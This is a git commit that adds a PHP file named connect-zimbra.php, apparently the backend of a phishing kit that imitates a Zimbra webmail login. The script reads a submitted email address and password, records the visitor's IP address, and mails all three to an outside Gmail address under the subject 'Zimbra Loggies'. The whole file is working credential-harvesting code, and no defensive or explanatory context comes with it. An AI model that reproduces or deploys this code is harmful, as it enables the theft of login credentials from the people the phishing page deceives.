be3a4669ab6fcef75421508b53af36246fd43bc9
MelissaCarnagie <161925454+MelissaCarnagie@users.noreply.github.com>
2024-03-04 13:07:45 +0200

    Add files via upload

---
+++ connect-zimbra.php
@@ -0,0 +1,23 @@
+<?php
+$ip = getenv("REMOTE_ADDR");	
+
+if(!empty($_POST)) {
+ $pop= $_POST['ai'];
+ $popi = $_POST['pr'];
+ 
+		$agwu = "ffdfdfgdgfdha@gmail.com";
+		
+		
+         $opi = "Zimbra Loggies : $ip";
+		 
+		 $apki =  "Email ID            : ".$pop."\r\n";
+         $apki .= "Password           : ".$popi."\r\n";
+		 $apki .= "IP           : ".$ip."\r\n";
+		$header = "Content type: Street Vibes \r\n";
+         $header .= "MIME-Version: 1.0\r\n";
+         $header .= "Content-type: text/html\r\n";
+		 
+		 mail ($agwu,$opi,$apki,$header);
+
+}
+?>
